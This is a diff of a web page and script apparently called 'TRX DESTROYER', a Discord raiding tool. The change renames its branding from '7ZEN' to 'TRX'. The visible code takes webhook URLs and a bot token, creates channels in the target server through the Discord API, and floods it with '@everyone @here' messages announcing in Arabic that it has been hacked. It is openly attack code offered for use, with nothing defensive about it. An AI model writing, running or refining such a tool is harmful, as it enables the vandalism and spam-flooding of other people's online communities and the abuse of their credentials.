@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>☣️ 7ZEN ☣️ · TRX DESTROYER</title>
+<title>☣️  · TRX DESTROYER</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Segoe UI',Arial,sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
@@ -52,7 +52,7 @@ textarea{border-radius:16px;height:150px;margin-top:10px;background:#050505;colo
 </head>
 <body>
 <div class="box">
-<h1>☠️ 7ZEN</h1>
+<h1>☠️ TRX </h1>
 <p class="sub">● فحص · سبام · جميع القنوات · ويبهوكات ●</p>
 <div class="row">
 <input type="text" id="wh" placeholder="https://discord.com/api/webhooks/..." style="flex:3">
@@ -100,12 +100,12 @@ textarea{border-radius:16px;height:150px;margin-top:10px;background:#050505;colo
 <div class="st">الرسائل:</div>
 <div id="cnt">0</div>
 <textarea id="log" readonly></textarea>
-<div class="bg">● ☣️ 7ZEN ☣️ · TRX HUB ☣️ ●</div>
+<div class="bg">● TRX  ☣️ ●</div>
 </div>
 <script>
 let R=false,S=false,N=0,TM=[],CH=[],WH=null,WHs=[];
 const AV='https://github.com/Rxz60/MR-HUB/raw/refs/heads/main/IMG_5011.jpeg';
-const UN='☣️ TRX HUB ☣️ · ☣️ 7zen ☣️';
+const UN='☣️ TRX  ';
 const $=i=>document.getElementById(i);
 const L=m=>{const e=$('log');e.value+=`[${new Date().toLocaleTimeString('ar-SA')}] ${m}\n`;e.scrollTop=e.scrollHeight};
 const QC=()=>{const q=document.querySelectorAll('.wu');let c=0;for(const e of q)if(e.value.trim())c++;$('whc').textContent=`(${c})`};
@@ -191,7 +191,7 @@ if(!tk){L('⚠️ مافي بوت');return false}
 if(!WH||!WH.guild_id){L('❌ اضغط فحص أول');return false}
 const gid=WH.guild_id;let sc=0;
 for(let i=0;i<5;i++){
-if(S)break;const nm=`☣️7zen☣️-${i+1}`;
+if(S)break;const nm=`☣️TRX☣️-${i+1}`;
 try{
 const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/guilds/${gid}/channels`),{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:nm,type:0})});
 if(r.ok){const d=await r.json();CH.push(d.id);sc++;L(`✅ #${nm}`)}
@@ -232,8 +232,8 @@ const u=GA();if(u.length===0){alert('⚠️ أضف ويبهوك');return}
 if(R)return
 R=true;S=false;N=0;CH=[];TM=[]
 $('cnt').textContent='0';$('go').disabled=true;$('st').disabled=false;$('sc').disabled=true;$('cwb').disabled=true;$('fwb').disabled=true;$('log').value=''
-L('🚀 ☣️ 7ZEN ☣️ DESTROYER');L(`📌 ${u.length} ويبهوك`);L(`👤 ${UN}`)
-const msg='@everyone @here 7ZEN · تم التهكير من قبل ☣️ TRX HUB ☣️ · ☣️ 7zen ☣️ · النظام التراكسي · @here @everyone'
+L('🚀 ☣️ TRX ☣️ DESTROYER');L(`📌 ${u.length} ويبهوك`);L(`👤 ${UN}`)
+const msg='@everyone @here  تم التهكير من قبل TRX · @here @everyone'
 L1(msg);L2(msg);L3(msg);L4(msg)
 const cb=document.querySelector('#wl input[type="checkbox"]');if(cb&&cb.checked||true){L('🏗️ رومات 7ZEN...');await MKCH()}
 TM.push(setInterval(()=>{if(S)return;L(`📊 ${N} رسالة | ${GA().length} ويبهوك`)},5000))
